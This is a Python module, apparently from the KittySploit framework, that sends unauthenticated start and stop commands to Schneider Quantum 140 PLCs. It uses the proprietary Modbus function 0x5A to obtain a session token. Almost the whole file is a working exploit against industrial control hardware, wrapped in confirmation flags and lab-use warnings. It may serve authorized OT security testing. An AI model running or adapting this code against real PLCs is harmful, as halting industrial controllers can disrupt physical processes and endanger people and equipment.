#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Schneider Quantum 140 series PLC start/stop control.

Uses Schneider's proprietary Modbus extension (function 0x5A) to obtain a session
token and send START or STOP commands to the PLC CPU.
"""

from __future__ import annotations

from kittysploit import *
from lib.protocols.ics.constants import ICS_PROTOCOL_PORTS
from lib.protocols.ics.ics_scanner_client import Ics_scanner_client
from lib.protocols.ics.schneider_quantum import QuantumCommand, SchneiderQuantumClient


class Module(Auxiliary, Ics_scanner_client):
    __info__ = {
        "name": "Schneider Quantum 140 PLC control",
        "description": (
            "Uses Modbus/TCP with Schneider Quantum proprietary function 0x5A to "
            "start or stop Schneider Quantum 140 series PLCs without authentication."
        ),
        "author": ["w3h", "wenzhe zhu", "KittySploit Team"],
        "references": [
            "https://github.com/w3h/isf/blob/master/module/exploits/Schneider/Schneider_CPU_Comoand.py",
        ],
        "platform": Platform.OTHER,
        "tags": ["ics", "schneider", "modbus", "quantum", "plc", "ot"],
        "agent": {
            "risk": "intrusive",
            "effects": ["active_exploitation"],
            "expected_requests": 2,
            "reversible": True,
            "approval_required": True,
            "produces": ["risk_signals"],
            "chain": {
                "requires_ot_context": True,
            },
        },
    }

    port = OptPort(ICS_PROTOCOL_PORTS["modbus-tcp"], "Modbus TCP port", True)
    command = OptChoice("stop", "PLC command", True, choices=["start", "stop"])
    confirm = OptBool(False, "Confirm intentional PLC state change", True)

    def _resolve_command(self) -> QuantumCommand:
        action = str(self.command or "stop").strip().lower()
        if action == "start":
            return QuantumCommand.START
        return QuantumCommand.STOP

    def check(self):
        host = self._host()
        if not host:
            return {"vulnerable": False, "reason": "target not set", "confidence": "low"}
        if not bool(self.confirm):
            return {
                "vulnerable": False,
                "reason": "set confirm=true to acknowledge PLC control",
                "confidence": "high",
            }
        if not self.is_tcp_open():
            return {
                "vulnerable": False,
                "reason": f"TCP {self._port()} closed",
                "confidence": "high",
            }
        client = SchneiderQuantumClient(host, self._port(), self._timeout())
        if not client.connect():
            return {
                "vulnerable": False,
                "reason": "Modbus TCP connection failed",
                "confidence": "medium",
            }
        try:
            if client.get_session():
                return {
                    "vulnerable": True,
                    "reason": "Quantum session token obtained via FC 0x5A",
                    "confidence": "medium",
                }
            return {
                "vulnerable": False,
                "reason": "no Quantum session response",
                "confidence": "medium",
            }
        finally:
            client.close()

    def run(self):
        host = self._host()
        if not host:
            print_error("Target is required")
            return False
        if not bool(self.confirm):
            print_error("Refusing to control PLC without confirm=true")
            return False

        cmd = self._resolve_command()
        action = "START" if cmd == QuantumCommand.START else "STOP"

        print_warning(f"PLC {action} is disruptive — authorized OT lab use only")
        if not self.is_tcp_open():
            print_error(f"Target {host}:{self._port()} is not reachable")
            return False

        print_success("Target Modbus port is open")
        print_status(f"Sending PLC {action} command to {host}:{self._port()}...")

        client = SchneiderQuantumClient(host, self._port(), self._timeout())
        if not client.connect():
            print_error("Modbus TCP connection failed")
            return False

        try:
            if not client.get_session():
                print_error("Failed to obtain Quantum session token")
                return False
            print_status(f"Session token: {client.session_hex[:32]}...")

            if cmd == QuantumCommand.START:
                ok = client.start_plc()
            else:
                ok = client.stop_plc()

            if ok:
                print_success(f"PLC {action} command sent to {host}:{self._port()}")
                return True
            print_error(f"PLC {action} command failed")
            return False
        finally:
            client.close()
